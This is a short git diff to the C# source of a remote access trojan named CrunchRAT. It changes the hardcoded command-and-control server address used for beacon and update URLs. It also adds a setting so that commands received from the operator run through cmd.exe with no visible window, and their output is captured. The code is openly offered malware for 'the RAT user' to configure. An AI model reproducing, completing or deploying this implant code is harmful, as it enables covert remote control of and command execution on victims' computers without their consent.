@@ -15,7 +15,7 @@ namespace CrunchRAT
         // Main() function
         static void Main(string[] args)
         {
-            string c2 = "192.168.2.140";                                                                // NEEDS CHANGED BY THE RAT USER
+            string c2 = "192.168.2.148";                                                                // NEEDS CHANGED BY THE RAT USER
             string beaconURL = "https://" + c2 + "/beacon.php";                                         // NEEDS CHANGED BY THE RAT USER
             string updateURL = "https://" + c2 + "/update.php";                                         // NEEDS CHANGED BY THE RAT USER
             int beaconInterval = 30000;                                                                 // NEEDS CHANGED BY THE RAT USER
@@ -165,9 +165,10 @@ namespace CrunchRAT
         {
             Process cmd = new Process();
             cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            cmd.StartInfo.CreateNoWindow = true;
             cmd.StartInfo.UseShellExecute = false; // Must be set to false to redirect Standard Output and Standard Error streams
             cmd.StartInfo.FileName = "cmd.exe";
-            cmd.StartInfo.Arguments = "/C " + command;
+            cmd.StartInfo.Arguments = "/c " + command;
             cmd.StartInfo.RedirectStandardOutput = true;
             cmd.StartInfo.RedirectStandardError = true;
             cmd.Start();
